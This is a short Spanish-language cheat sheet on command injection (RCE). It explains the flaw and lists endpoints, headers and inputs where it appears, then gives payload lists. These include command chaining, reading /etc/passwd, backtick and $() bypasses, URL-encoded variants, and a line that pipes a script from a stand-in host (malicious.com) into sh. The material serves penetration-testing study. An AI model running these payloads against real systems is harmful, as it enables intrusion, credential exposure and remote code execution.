# Command Injection (RCE)

## Descripción

La vulnerabilidad de **Command Injection** ocurre cuando una aplicación permite la ejecución de comandos del sistema sin una validación adecuada. Esto permite a un atacante ejecutar comandos arbitrarios en el servidor, lo que puede llevar a la exposición de datos, el control total del sistema y la persistencia en el servidor.

Este falla es especialmente crítica cuando la aplicación ejecuta comandos del sistema basados en la entrada del usuario sin saneamiento.

---

## Dónde buscar Command Injection

### Endpoints comunes
- **Formularios de búsqueda** (`/search?q=QUERY`).
- **Paneles de administración** (`/admin/run?cmd=`).
- **Carga de archivos** (validar nombres de archivo y comandos incrustados).
- **APIs con ejecución de comandos** (`/api/exec?cmd=`).
- **Diagnósticos de red** (`/ping?host=` o `/traceroute?target=`).
- **Conversión de archivos** (`/convert?format=`).

### Cabeceras HTTP
- **User-Agent**: Puede ser inyectado en registros del sistema.
- **Referer**: Puede ser utilizado para manipular registros de logs y comandos subsiguientes.
- **X-Forwarded-For**: Puede ser inyectado en validaciones de direcciones IP.

### Datos de usuario
- **Inputs de formularios** (como nombres de usuario, consultas de búsqueda, etc.).
- **Archivos JSON o XML** que contengan comandos ejecutables.

---

## Payloads comunes

### Básicos
```bash
; id
& whoami &
&& cat /etc/passwd
```

### Encadenados con operadores
```bash
; ls -la
| uname -a
&& curl http://malicious.com/shell.sh | sh
```

### Con bypass de filtrado
```bash
`id`
$(`whoami`)
$(cat /etc/passwd)
```

### Variantes codificadas
```bash
%3B%20id
%26%26%20whoami
%60cat%20/etc/passwd%60
```
